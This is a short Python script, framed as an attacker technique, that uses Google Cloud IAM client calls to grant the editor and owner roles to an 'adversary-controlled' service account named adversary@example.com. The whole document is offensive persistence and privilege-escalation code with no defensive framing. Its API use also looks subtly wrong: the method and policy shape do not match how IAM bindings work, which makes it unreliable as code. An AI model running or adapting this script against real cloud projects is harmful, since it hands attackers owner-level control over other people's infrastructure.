from google.oauth2 import service_account
from googleapiclient.discovery import build

# Add additional roles or permissions to an adversary-controlled cloud account
def add_roles(project_id, service_account_email, new_roles):
    credentials = service_account.Credentials.from_service_account_file(
        'path/to/service-account.json',
        scopes=['https://www.googleapis.com/auth/cloud-platform']
    )
    service = build('iam', 'v1', credentials=credentials)
    for role in new_roles:
        service.projects().serviceAccounts().addIamPolicyBinding(
            name=f"projects/{project_id}/serviceAccounts/{service_account_email}",
            body={
                "policy": {
                    "bindings": [
                        {
                            "role": role,
                            "members": [
                                f"serviceAccount:{service_account_email}"
                            ]
                        }
                    ]
                }
            }
        ).execute()

add_roles("project-id", "adversary@example.com", ["roles/editor", "roles/owner"])